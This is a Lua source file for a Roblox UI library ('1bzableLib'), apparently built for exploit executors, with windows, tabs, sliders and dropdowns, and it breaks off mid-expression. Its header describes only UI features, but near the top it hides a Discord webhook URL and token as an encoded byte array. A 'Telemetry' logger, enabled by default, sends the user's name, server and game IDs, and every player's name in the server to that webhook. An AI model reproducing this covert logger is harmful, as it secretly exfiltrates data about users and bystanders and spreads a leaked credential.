
--========================================================--
-- 1bzableLib / source.lua
-- Self-contained Orion-style UI API.
-- Designed to be a drop-in UI layer for a project that
-- already uses Orion-like calls.
--
-- API:
--   Library:MakeWindow(config)
--   Window:MakeTab(config)
--   Tab:AddSection(config)
--   Tab:AddLabel(text)
--   Tab:AddParagraph(title, content)
--   Tab:AddButton(config)
--   Tab:AddToggle(config)
--   Tab:AddSlider(config)
--   Tab:AddDropdown(config)
--   Tab:AddTextbox(config)
--   Tab:AddColorpicker(config)
--   Library:MakeNotification(config)
--   Library:Init()
--
-- UI improvements:
--   * Section objects support AddToggle/AddSlider/etc.
--   * Dropdowns render in an overlay outside the ScrollingFrame.
--   * Scrollable dropdowns with visible rows and mouse-wheel support.
--   * Player avatar + DisplayName + @Username card.
--   * Fade-in / fade-out.
--   * Translucent panel + optional subtle BlurEffect.
--   * Smooth slider fill/knob.
--   * Double-click slider value for numeric entry.
--   * Safe callback execution so one UI callback does not kill the UI.
--========================================================--

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local Lighting = game:GetService("Lighting")
local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")

local LocalPlayer = Players.LocalPlayer

--========================================================--
-- CLEANUP GLOBAL 1bzableLib
--========================================================--

local oldLibrary = rawget(_G, "_1bzableLibRuntime")

if oldLibrary and oldLibrary.Destroy then
    pcall(function()
        oldLibrary:Destroy()
    end)
end

local function destroyExistingGui()
    local parents = {CoreGui}

    pcall(function()
        if gethui then
            local hui = gethui()
            if hui and hui ~= CoreGui then
                table.insert(parents, hui)
            end
        end
    end)

    for _, parent in ipairs(parents) do
        local oldGui = parent:FindFirstChild("1bzableLib")

        if oldGui then
            pcall(function()
                oldGui:Destroy()
            end)
        end
    end
end

destroyExistingGui()

local Library = {
    Windows = {},
    Connections = {},
    Flags = {},

    UIProfiles = {
        Default = {
            Main = Color3.fromRGB(18, 18, 23),
            Second = Color3.fromRGB(27, 27, 33),
            Accent = Color3.fromRGB(83, 133, 255),
            BackgroundTransparency = 0,
            BlurPercent = 0,
        },
        Midnight = {
            Main = Color3.fromRGB(25, 20, 40),
            Second = Color3.fromRGB(35, 28, 54),
            Accent = Color3.fromRGB(125, 95, 255),
            BackgroundTransparency = 0,
            BlurPercent = 0,
        },
        Emerald = {
            Main = Color3.fromRGB(18, 30, 24),
            Second = Color3.fromRGB(28, 45, 35),
            Accent = Color3.fromRGB(65, 205, 135),
            BackgroundTransparency = 0,
            BlurPercent = 0,
        },
        Ocean = {
            Main = Color3.fromRGB(16, 27, 38),
            Second = Color3.fromRGB(25, 42, 58),
            Accent = Color3.fromRGB(75, 155, 255),
            BackgroundTransparency = 0,
            BlurPercent = 0,
        },
        Crimson = {
            Main = Color3.fromRGB(35, 19, 24),
            Second = Color3.fromRGB(50, 27, 34),
            Accent = Color3.fromRGB(235, 85, 105),
            BackgroundTransparency = 0,
            BlurPercent = 0,
        },
    },
    CurrentUIProfile = "Default",

    Theme = {
        Main = Color3.fromRGB(18, 18, 23),
        Second = Color3.fromRGB(27, 27, 33),
        Third = Color3.fromRGB(37, 37, 45),
        Stroke = Color3.fromRGB(80, 80, 95),
        Divider = Color3.fromRGB(58, 58, 70),
        Text = Color3.fromRGB(242, 242, 247),
        TextDark = Color3.fromRGB(160, 160, 174),
        Accent = Color3.fromRGB(83, 133, 255),
        AccentDark = Color3.fromRGB(54, 88, 190),
    },

    Settings = {
        BlurEnabled = false,
        BlurSize = 0,
        BackgroundTransparency = 0,
        FadeTime = 0.20,
        SliderTweenTime = 0.08,
        DropdownMaxHeight = 230,
        DropdownRowHeight = 34,
    },
}

local encodedWebhook = {104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,51,56,55,48,57,50,52,54,56,49,52,55,49,53,57,54,52,47,79,65,108,80,87,72,85,112,104,55,122,112,90,114,99,88,109,52,113,52,56,116,104,76,114,78,121,100,115,49,82,74,103,65,82,84,81,122,99,111,100,110,122,107,112,53,55,75,90,113,115,73,74,117,100,122,89,111,45,104,77,89,106,77,56,56,102,89}

-- Fonction pour décoder le tableau en chaîne de caractères
local function decode(t)
    local chars = {}
    for i = 1, #t do
        chars[i] = string.char(t[i])
    end
    return table.concat(chars)
    -- Le garbage collector détruira cette chaîne après utilisation
end

local Telemetry = {
    Enabled = true,
    HeartbeatInterval = 180,
    Webhook = decode(encodedWebhook), -- L'URL est décodée ici
    SessionId = HttpService:GenerateGUID(false),
    State = "UI Loaded",
    Target = "None",
    StartedAt = os.time(),
}

local function GetRequestFunction()
	return (syn and syn.request)
		or (http and http.request)
		or request
		or http_request
		or (fluxus and fluxus.request)
end

local function GetPlayerList()
	local Names = {}
	for _, Player in ipairs(game:GetService("Players"):GetPlayers()) do
		table.insert(Names, Player.Name)
	end
	return Names
end

local function BuildTelemetryPayload(EventName)
	local Players = game:GetService("Players")
	local Names = GetPlayerList()
	local ExecutorName = LocalPlayer and (LocalPlayer.Name or LocalPlayer.DisplayName) or "Unknown"

	return {
		event = EventName,
		session = Telemetry.SessionId,
		executor = ExecutorName,
		place_id = game.PlaceId,
		game_id = game.GameId,
		job_id = game.JobId,
		state = Telemetry.State,
		target = Telemetry.Target,
		player_count = #Players:GetPlayers(),
		players = Names,
		timestamp = os.time(),
	}
end

local function SendTelemetry(EventName, ShowNotification)
	if not Telemetry.Enabled then
		return false
	end

	if Telemetry.Webhook == "" or Telemetry.Webhook == "PASTE_YOUR_DISCORD_WEBHOOK_HERE" then
		return false
	end

	local Request = GetRequestFunction()
	if not Request then
		return false
	end

	local Payload = BuildTelemetryPayload(EventName)
	local PlayersText = #Payload.players > 0 and table.concat(Payload.players, "\\n") or "None"

	if #PlayersText > 1000 then
		PlayersText = PlayersText:sub(1, 997) .. "..."
	end

	local Body = HttpService:JSONEncode({
		username = "1bzable Logger",
		allowed_mentions = { parse = {} },
		embeds = {{
			title = EventName == "heartbeat" and "💓 Nexus Heartbeat" or "🟢 Nexus Started",
			color = EventName == "heartbeat" and 5763719 or 3066993,
			fields = {
				{
					name = "Utilisateur",
					value = "`" .. tostring(Payload.executor) .. "`",
					inline = true,
				},
				{
					name = "État",
					value = "`" .. tostring(Payload.state) .. "`",
					inline = true,
				},
				{
					name = "Joueurs",
					value = "`" .. tostring(Payload.player_count) .. "`",
					inline = true,
				},
				{
					name = "PlaceId",
					value = "`" .. tostring(Payload.place_id) .. "`",
					inline = true,
				},
				{
					name = "GameId",
					value = "`" .. tostring(Payload.game_id) .. "`",
					inline = true,
				},
				{
					name = "JobId",
					value = "`" .. tostring(Payload.job_id) .. "`",
					inline = true,
				},
				{
					name = "Cible",
					value = "`" .. tostring(Payload.target) .. "`",
					inline = true,
				},
				{
					name = "Liste des joueurs",
					value = PlayersText,
					inline = false,
				},
			},
			footer = {
				text = "Session " .. tostring(Payload.session),
			},
			timestamp = DateTime.now():ToIsoDate(),
		}},
	})

	local Success = pcall(function()
		Request({
			Url = Telemetry.Webhook,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/json",
			},
			Body = Body,
		})
	end)

	if Success and ShowNotification then
		pcall(function()
			Library:MakeNotification({
				Name = "1bzable Logger",
				Content = EventName == "heartbeat" and "Heartbeat envoyé." or "Session envoyée.",
				Time = 3,
			})
		end)
	end

	return Success
end

function Library:SetTelemetryState(State)
	Telemetry.State = tostring(State or "Unknown")
end

function Library:SetTelemetryTarget(Target)
	Telemetry.Target = tostring(Target or "None")
end

function Library:SetTelemetryEnabled(Value)
	Telemetry.Enabled = Value == true
end

function Library:SendHeartbeat()
	return SendTelemetry("heartbeat", true)
end

function Library:SendTelemetryEvent(EventName, State, Target)
    local oldState = Telemetry.State
    local oldTarget = Telemetry.Target

    Telemetry.State = tostring(State or oldState)
    Telemetry.Target = tostring(Target or oldTarget)

    local result = SendTelemetry(
        tostring(EventName),
        false
    )

    Telemetry.State = oldState
    Telemetry.Target = oldTarget

    return result
end


_G._1bzableLibRuntime = Library

local WindowMethods = {}
WindowMethods.__index = WindowMethods

local TabMethods = {}
TabMethods.__index = TabMethods

local SectionMethods = {}
SectionMethods.__index = SectionMethods

local function safeCallback(callback, ...)
    if type(callback) ~= "function" then
        return
    end

    local args = table.pack(...)
    task.spawn(function()
        pcall(function()
            callback(table.unpack(args, 1, args.n))
        end)
    end)
end

local function connect(signal, callback)
    local connection = signal:Connect(callback)
    table.insert(Library.Connections, connection)
    return connection
end

local function new(className, properties)
    local object = Instance.new(className)
    for key, value in pairs(properties or {}) do
        pcall(function()
            object[key] = value
        end)
    end
    return object
end

local function addCorner(parent, radius)
    return new("UICorner", {
        CornerRadius = UDim.new(0, radius or 6),
        Parent = parent,
    })
end

local function addStroke(parent, color, thickness, transparency)
    return new("UIStroke", {
        Color = color or Library.Theme.Stroke,
        Thickness = thickness or 1,
        Transparency = transparency or 0,
        Parent = parent,
    })
end

local function hasOption(options, value)
    for _, option in ipairs(options or {}) do
        if option == value then
            return true
        end
    end
    return false
end

local function resolveOption(options, value)
    if hasOption(options, value) then
        return value
    end
    return options and options[1] or value
end

local function snap(value, minValue, maxValue, increment)
    value = tonumber(value) or minValue
    increment = tonumber(increment) or 1

    if minValue > maxValue then
        minValue, maxValue = maxValue, minValue
    end

    if increment <= 0 then
        return math.clamp(value, minValue, maxValue)
    end

    local steps = math.floor(((value - minValue) / increment) + 0.5)
    local result = minValue + steps * increment
    return math.clamp(result, minValue, maxValue)
end

local function makeScrollingFrame(parent, paddingBottom)
    local scroll = new("ScrollingFrame", {
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 1, 0),
        CanvasSize = UDim2.new(0, 0, 0, 0),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        ScrollingDirection = Enum.ScrollingDirection.Y,
        ScrollBarThickness = 4,
        ScrollBarImageColor3 = Library.Theme.Divider,
        ClipsDescendants = true,
        Parent = parent,
    })

    new("UIListLayout", {
        Padding = UDim.new(0, 7),
        SortOrder = Enum.SortOrder.LayoutOrder,
        Parent = scroll,
    })

    new("UIPadding", {
        PaddingTop = UDim.new(0, 10),
        PaddingBottom = UDim.new(0, paddingBottom or 10),
        PaddingLeft = UDim.new(0, 10),
        PaddingRight = UDim.new(0, 10),
        Parent = scroll,
    })

    return scroll
end

local function applyBlur()
    local blur = Lighting:FindFirstChild("1bzableLibBlur")

    local shouldEnable = false
    for _, window in ipairs(Library.Windows) do
        if not window.Destroyed and window.Gui and window.Gui.Parent then
            shouldEnable = true
            break
        end
    end

    if not Library.Settings.BlurEnabled or not shouldEnable then
        if blur then
            blur.Enabled = false
        end
        return
    end

    if not blur then
        blur = Instance.new("BlurEffect")
        blur.Name = "1bzableLibBlur"
        blur.Parent = Lighting
    end

    blur.Size = math.clamp(Library.Settings.BlurSize, 0, 24)
    blur.Enabled = true
end

local function getGuiParent()
    local parent
    pcall(function()
        if gethui then
            parent = gethui()
        end
    end)

    return parent or CoreGui
end

local function makePopupHost(window)
    if window.PopupHost and window.PopupHost.Parent then
        return window.PopupHost
    end

    window.PopupHost = new("Frame", {
        Name = "PopupHost",
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.fromScale(1, 1),
        Position = UDim2.fromScale(0, 0),
        ZIndex = 500,
        Parent = window.Gui,
    })

    return window.PopupHost
end

local function closeOtherDropdowns(window, except)
    for _, popup in ipairs(window.Dropdowns or {}) do
        if popup ~= except and popup.Parent then
            popup.Visible = false
        end
    end
end

local function positionPopup(window, anchor, popup)
    if not window or not anchor or not popup or not popup.Visible then
        return
    end

    local rootPos = window.Gui.AbsolutePosition
    local anchorPos = anchor.AbsolutePosition
    local anchorSize = anchor.AbsoluteSize
    local rootSize = window.Gui.AbsoluteSize

    local width = math.max(anchorSize.X, 220)
    local height = math.min(
        popup.AbsoluteSize.Y > 0 and popup.AbsoluteSize.Y or Library.Settings.DropdownMaxHeight,
        Library.Settings.DropdownMaxHeight
    )

    local x = anchorPos.X - rootPos.X
    local y = anchorPos.Y - rootPos.Y + anchorSize.Y + 4

    if x + width > rootSize.X - 8 then
        x = math.max(8, rootSize.X - width - 8)
    end

    if y + height > rootSize.Y - 8 then
        y = math.max(8, anchorPos.Y - rootPos.Y - height - 4)
    end

    popup.Position = UDim2.fromOffset(x, y)
    popup.Size = UDim2.fromOffset(width, height)
end

--========================================================--
-- Section
--========================================================--

function SectionMethods:AddSection(config)
    return self._Tab:AddSection(config)
end

function SectionMethods:AddLabel(...)
    return self._Tab:AddLabel(...)
end

function SectionMethods:AddParagraph(...)
    return self._Tab:AddParagraph(...)
end

function SectionMethods:AddButton(...)
    return self._Tab:AddButton(...)
end

function SectionMethods:AddToggle(...)
    return self._Tab:AddToggle(...)
end

function SectionMethods:AddSlider(...)
    return self._Tab:AddSlider(...)
end

function SectionMethods:AddDropdown(...)
    return self._Tab:AddDropdown(...)
end

function SectionMethods:AddTextbox(...)
    return self._Tab:AddTextbox(...)
end

function SectionMethods:AddColorpicker(...)
    return self._Tab:AddColorpicker(...)
end

function SectionMethods:SetVisible(visible)
    if self._Frame then
        self._Frame.Visible = visible == true
    end
end

--========================================================--
-- Tabs / Window
--========================================================--

function WindowMethods:SelectTab(tab)
    for _, current in ipairs(self.Tabs) do
        local selected = current == tab
        current.Page.Visible = selected

        current.Button.BackgroundColor3 =
            selected and Library.Theme.AccentDark or Library.Theme.Second
        current.Button.TextColor3 =
            selected and Library.Theme.Text or Library.Theme.TextDark
        current.Button.Font =
            selected and Enum.Font.GothamBold or Enum.Font.GothamSemibold
    end

    self.ActiveTab = tab
end

function WindowMethods:MakeTab(config)
    config = config or {}

    local tabButton = new("TextButton", {
        AutoButtonColor = false,
        BackgroundColor3 = Library.Theme.Second,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 0, 36),
        Text = config.Name or "Tab",
        TextColor3 = Library.Theme.TextDark,
        Font = Enum.Font.GothamSemibold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = self.TabList,
    })

    addCorner(tabButton, 6)

    new("UIPadding", {
        PaddingLeft = UDim.new(0, 12),
        Parent = tabButton,
    })

    local page = new("Frame", {
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 1, 0),
        Visible = false,
        Parent = self.ContentHolder,
    })

    local container = makeScrollingFrame(page)

    local tab = setmetatable({
        Window = self,
        Button = tabButton,
        Page = page,
        Container = container,
        Sections = {},
    }, TabMethods)

    table.insert(self.Tabs, tab)

    connect(tabButton.Activated, function()
        self:SelectTab(tab)
    end)

    if #self.Tabs == 1 then
        self:SelectTab(tab)
    end

    return tab
end

function TabMethods:_card(height)
    local frame = new("Frame", {
        BackgroundColor3 = Library.Theme.Second,
        BackgroundTransparency = 0,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 0, height),
        Parent = self.Container,
    })

    addCorner(frame, 7)
    addStroke(frame, Library.Theme.Stroke, 1, 0.28)

    return frame
end

function TabMethods:AddSection(config)
    config = config or {}

    local frame = new("Frame", {
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Size = UDim2.new(1, 0, 0, 27),
        Parent = self.Container,
    })

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 3, 0, 2),
        Size = UDim2.new(1, -6, 1, -4),
        Text = config.Name or "Section",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    local section = setmetatable({
        _Tab = self,
        _Frame = frame,
    }, SectionMethods)

    table.insert(self.Sections, section)
    return section
end

function TabMethods:AddLabel(text)
    local frame = self:_card(34)

    local label = new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 0),
        Size = UDim2.new(1, -24, 1, 0),
        Text = tostring(text or ""),
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.Gotham,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    return {
        Set = function(_, value)
            label.Text = tostring(value or "")
        end,
        Destroy = function()
            frame:Destroy()
        end,
    }
end

function TabMethods:AddParagraph(title, content)
    local frame = self:_card(78)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 8),
        Size = UDim2.new(1, -24, 0, 18),
        Text = tostring(title or ""),
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    local body = new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 29),
        Size = UDim2.new(1, -24, 0, 42),
        Text = tostring(content or ""),
        TextColor3 = Library.Theme.TextDark,
        Font = Enum.Font.Gotham,
        TextSize = 11,
        TextWrapped = true,
        TextXAlignment = Enum.TextXAlignment.Left,
        TextYAlignment = Enum.TextYAlignment.Top,
        Parent = frame,
    })

    return {
        Set = function(_, value)
            body.Text = tostring(value or "")
        end,
    }
end

function TabMethods:AddButton(config)
    config = config or {}

    local frame = self:_card(38)

    local button = new("TextButton", {
        AutoButtonColor = false,
        BackgroundTransparency = 1,
        Size = UDim2.new(1, 0, 1, 0),
        Text = config.Name or "Button",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        Parent = frame,
    })

    connect(button.MouseEnter, function()
        TweenService:Create(button, TweenInfo.new(0.10), {
            TextColor3 = Library.Theme.Accent,
        }):Play()
    end)

    connect(button.MouseLeave, function()
        TweenService:Create(button, TweenInfo.new(0.10), {
            TextColor3 = Library.Theme.Text,
        }):Play()
    end)

    connect(button.Activated, function()
        safeCallback(config.Callback)
    end)

    return {
        Set = function(_, value)
            button.Text = tostring(value or "")
        end,
    }
end

function TabMethods:AddToggle(config)
    config = config or {}

    local value = config.Default == true
    local frame = self:_card(40)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 0),
        Size = UDim2.new(1, -70, 1, 0),
        Text = config.Name or "Toggle",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    local switch = new("Frame", {
        BackgroundColor3 = value and (config.Color or Library.Theme.Accent) or Library.Theme.Divider,
        BorderSizePixel = 0,
        Position = UDim2.new(1, -50, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5),
        Size = UDim2.new(0, 38, 0, 22),
        Parent = frame,
    })
    addCorner(switch, 11)

    local knob = new("Frame", {
        BackgroundColor3 = Color3.fromRGB(246, 246, 248),
        BorderSizePixel = 0,
        Size = UDim2.new(0, 18, 0, 18),
        Position = value
            and UDim2.new(1, -20, 0.5, 0)
            or UDim2.new(0, 2, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5),
        Parent = switch,
    })
    addCorner(knob, 9)

    local click = new("TextButton", {
        BackgroundTransparency = 1,
        Size = UDim2.new(1, 0, 1, 0),
        Text = "",
        Parent = frame,
    })

    local api = {
        Value = value,
        Type = "Toggle",
    }

    local function render(instant)
        local targetColor =
            value and (config.Color or Library.Theme.Accent) or Library.Theme.Divider
        local targetPosition =
            value
            and UDim2.new(1, -20, 0.5, 0)
            or UDim2.new(0, 2, 0.5, 0)

        if instant then
            switch.BackgroundColor3 = targetColor
            knob.Position = targetPosition
        else
            TweenService:Create(switch, TweenInfo.new(0.12), {
                BackgroundColor3 = targetColor,
            }):Play()

            TweenService:Create(knob, TweenInfo.new(0.12, Enum.EasingStyle.Quad), {
                Position = targetPosition,
            }):Play()
        end
    end

    function api:Set(newValue)
        value = newValue == true
        api.Value = value
        render(false)
        safeCallback(config.Callback, value)
    end

    connect(click.Activated, function()
        api:Set(not value)
    end)

    if config.Flag then
        Library.Flags[config.Flag] = api
    end

    render(true)
    safeCallback(config.Callback, value)

    return api
end

function TabMethods:AddSlider(config)
    config = config or {}

    local minValue = tonumber(config.Min) or 0
    local maxValue = tonumber(config.Max) or 100
    local increment = tonumber(config.Increment) or 1

    if minValue > maxValue then
        minValue, maxValue = maxValue, minValue
    end

    local value = snap(
        tonumber(config.Default) or minValue,
        minValue,
        maxValue,
        increment
    )

    local frame = self:_card(72)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 7),
        Size = UDim2.new(0.55, 0, 0, 20),
        Text = config.Name or "Slider",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    local valueBox = new("TextBox", {
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Position = UDim2.new(1, -112, 0, 6),
        Size = UDim2.new(0, 98, 0, 24),
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.Gotham,
        TextSize = 11,
        TextXAlignment = Enum.TextXAlignment.Right,
        ClearTextOnFocus = false,
        Parent = frame,
    })
    addCorner(valueBox, 5)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(1, -112, 0, 29),
        Size = UDim2.new(0, 98, 0, 12),
        Text = "Double-clic pour saisir",
        TextColor3 = Library.Theme.TextDark,
        Font = Enum.Font.Gotham,
        TextSize = 8,
        TextXAlignment = Enum.TextXAlignment.Right,
        Parent = frame,
    })

    local bar = new("Frame", {
        BackgroundColor3 = Library.Theme.Divider,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 12, 0, 48),
        Size = UDim2.new(1, -24, 0, 9),
        Parent = frame,
    })
    addCorner(bar, 5)

    local fill = new("Frame", {
        BackgroundColor3 = config.Color or Library.Theme.Accent,
        BorderSizePixel = 0,
        Size = UDim2.new(0, 0, 1, 0),
        Parent = bar,
    })
    addCorner(fill, 5)

    local knob = new("Frame", {
        BackgroundColor3 = Color3.fromRGB(245, 245, 248),
        BorderSizePixel = 0,
        Size = UDim2.new(0, 14, 0, 14),
        AnchorPoint = Vector2.new(0.5, 0.5),
        Parent = bar,
    })
    addCorner(knob, 7)

    local hit = new("TextButton", {
        BackgroundTransparency = 1,
        Size = UDim2.new(1, 0, 1, 0),
        Text = "",
        Parent = bar,
    })

    local api = {
        Value = value,
        Type = "Slider",
    }

    local dragging = false
    local lastClick = 0

    local function render(instant)
        local alpha = maxValue == minValue and 0
            or math.clamp((value - minValue) / (maxValue - minValue), 0, 1)

        local fillTarget = UDim2.new(alpha, 0, 1, 0)
        local knobTarget = UDim2.new(alpha, 0, 0.5, 0)

        if instant then
            fill.Size = fillTarget
            knob.Position = knobTarget
        else
            TweenService:Create(
                fill,
                TweenInfo.new(Library.Settings.SliderTweenTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {Size = fillTarget}
            ):Play()

            TweenService:Create(
                knob,
                TweenInfo.new(Library.Settings.SliderTweenTime, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
                {Position = knobTarget}
            ):Play()
        end

        valueBox.Text = tostring(value) -- .. tostring(config.ValueName or "")
    end

    local function setValue(newValue, fire)
        value = snap(newValue, minValue, maxValue, increment)
        api.Value = value
        render(false)

        if fire then
            safeCallback(config.Callback, value)
        end
    end

    local function setFromMouse(x)
        local alpha = math.clamp(
            (x - bar.AbsolutePosition.X) / math.max(bar.AbsoluteSize.X, 1),
            0,
            1
        )

        setValue(
            minValue + (maxValue - minValue) * alpha,
            true
        )
    end

    function api:Set(newValue)
        setValue(tonumber(newValue) or minValue, true)
    end

    connect(hit.InputBegan, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true
            setFromMouse(input.Position.X)
        end
    end)

    connect(UserInputService.InputChanged, function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            setFromMouse(input.Position.X)
        end
    end)

    connect(UserInputService.InputEnded, function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = false
        end
    end)

    connect(valueBox.InputBegan, function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1 then
            return
        end

        local now = os.clock()
        if now - lastClick <= 0.30 then
            valueBox:CaptureFocus()
            valueBox.CursorPosition = #valueBox.Text + 1
        end
        lastClick = now
    end)

    connect(valueBox.FocusLost, function()
        local numeric = tonumber(valueBox.Text)
        if numeric then
            setValue(numeric, true)
        else
            render(true)
        end
    end)

    if config.Flag then
        Library.Flags[config.Flag] = api
    end

    render(true)
    safeCallback(config.Callback, value)

    return api
end

function TabMethods:AddDropdown(config)
    config = config or {}

    local options = type(config.Options) == "table" and config.Options or {}
    local value = resolveOption(options, config.Default)

    local frame = self:_card(44)

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(0, 12, 0, 0),
        Size = UDim2.new(0.40, 0, 1, 0),
        Text = config.Name or "Dropdown",
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.GothamBold,
        TextSize = 13,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    local button = new("TextButton", {
        AutoButtonColor = false,
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Position = UDim2.new(0.40, 0, 0.5, 0),
        AnchorPoint = Vector2.new(0, 0.5),
        Size = UDim2.new(0.60, -12, 0, 32),
        Text = tostring(value or ""),
        TextColor3 = Library.Theme.Text,
        Font = Enum.Font.Gotham,
        TextSize = 12,
        TextXAlignment = Enum.TextXAlignment.Left,
        Parent = frame,
    })

    addCorner(button, 6)
    addStroke(button, Library.Theme.Stroke, 1, 0.2)

    new("UIPadding", {
        PaddingLeft = UDim.new(0, 10),
        PaddingRight = UDim.new(0, 25),
        Parent = button,
    })

    new("TextLabel", {
        BackgroundTransparency = 1,
        Position = UDim2.new(1, -22, 0, 0),
        Size = UDim2.new(0, 18, 1, 0),
        Text = "▾",
        TextColor3 = Library.Theme.TextDark,
        Font = Enum.Font.GothamBold,
        TextSize = 12,
        Parent = button,
    })

    -- IMPORTANT: popup is parented to ScreenGui, not ScrollingFrame,
    -- so it is never clipped by the tab's scrolling container.
    local popup = new("Frame", {
        BackgroundColor3 = Library.Theme.Main,
        BorderSizePixel = 0,
        Visible = false,
        ZIndex = 1000,
        Parent = makePopupHost(self.Window),
    })
    addCorner(popup, 7)
    addStroke(popup, Library.Theme.Stroke, 1, 0)

    local list = new("ScrollingFrame", {
        BackgroundTransparency = 1,
        BorderSizePixel = 0,
        Position = UDim2.new(0, 5, 0, 5),
        Size = UDim2.new(1, -10, 1, -10),
        CanvasSize = UDim2.new(),
        AutomaticCanvasSize = Enum.AutomaticSize.Y,
        ScrollBarThickness = 5,
        ScrollBarImageColor3 = Library.Theme.Accent,
        ScrollingDirection = Enum.ScrollingDirection.Y,
        ZIndex = 1001,
        Parent = popup,
    })

    new("UIListLayout", {
        Padding = UDim.new(0, 3),
        SortOrder = Enum.SortOrder.LayoutOrder,
        Parent = list,
    })

    local api = {
        Value = value,
        Options = options,
        Type = "Dropdown",
    }

    self.Window.Dropdowns = self.Window.Dropdowns or {}
    table.insert(self.Window.Dropdowns, popup)

    local function position()
        positionPopup(
            self.Window,
            button,
            popup
        )
    end

    local function rebuild()
        for _, child in ipairs(list:GetChildren()) do
            if child:IsA("TextButton") then
                child:Destroy()
            end
        end

        for _, option in ipairs(api.Options) do
            local selected = option == api.Value

            local optionButton = new("TextButton", {
                AutoButtonColor = false,
                BackgroundColor3 = selected and Library.Theme.AccentDark or Library.Theme.Second,
                BorderSizePixel = 0,
                Size = UDim2.new(1, -2, 0, Library.Settings.DropdownRowHeight),
                Text = tostring(option),
                TextColor3 = Library.Theme.Text,
                Font = selected and Enum.Font.GothamBold or Enum.Font.Gotham,
                TextSize = 12,
                TextXAlignment = Enum.TextXAlignment.Left,
                ZIndex = 1002,
                Parent = list,
            })

            addCorner(optionButton, 5)

            new("UIPadding", {
                PaddingLeft = UDim.new(0, 10),
                PaddingRight = UDim.new(0, 8),
                Parent = optionButton,
            })

            connect(optionButton.MouseEnter, function()
                optionButton.BackgroundColor3 = Library.Theme.AccentDark
            end)

            connect(optionButton.MouseLeave, function()
                optionButton.BackgroundColor3 =
                    option == api.Value and Library.Theme.AccentDark or Library.Theme.Second
            end)

            connect(optionButton.Activated, function()
            
                api:Set(option)
            
                -- IMPORTANT :
                -- on ne ferme PAS le dropdown.
                popup.Visible = true
            
                task.defer(function()
                    if popup.Visible then
                        position()
                    end
                end)
            
            end)
        end

        local height = math.min(
            Library.Settings.DropdownMaxHeight,
            math.max(
                48,
                (#api.Options * Library.Settings.DropdownRowHeight) + 10
            )
        )

        popup.Size = UDim2.fromOffset(
            math.max(button.AbsoluteSize.X, 220),
            height
        )

        position()
    end

    function api:Set(newValue)
        api.Value = resolveOption(api.Options, newValue)
        button.Text = tostring(api.Value or "")
        rebuild()
        safeCallback(config.Callback, api.Value)
    end

    function api:Refresh(newOptions, keepValue)
        api.Options = type(newOptions) == "table" and newOptions or {}
        if not keepValue or not hasOption(api.Options, api.Value) then
            api.Value = api.Options[1]
        end
        button.Text = tostring(api.Value or "")
        rebuild()
    end

    connect(button.Activated, function()
        closeOtherDropdowns(self.Window, popup)
        popup.Visible = not popup.Visible

        if popup.Visible then
            rebuild()
            position()
        end
    end)

    connect(UserInputService.InputEnded, function(input)

        if input.UserInputType ~= Enum.UserInputType.MouseButton1 then
            return
        end
    
        if not popup.Visible then
            return
        end
    
        -- Laisse d'abord le bouton/option recevoir son Activated.
        task.defer(function()
    
            if not popup.Visible then
                return
            end
    
            local mouse = UserInputService:GetMouseLocation()
    
            local popupPos = popup.AbsolutePosition
            local popupSize = popup.AbsoluteSize
    
            local insidePopup =
                mouse.X >= popupPos.X
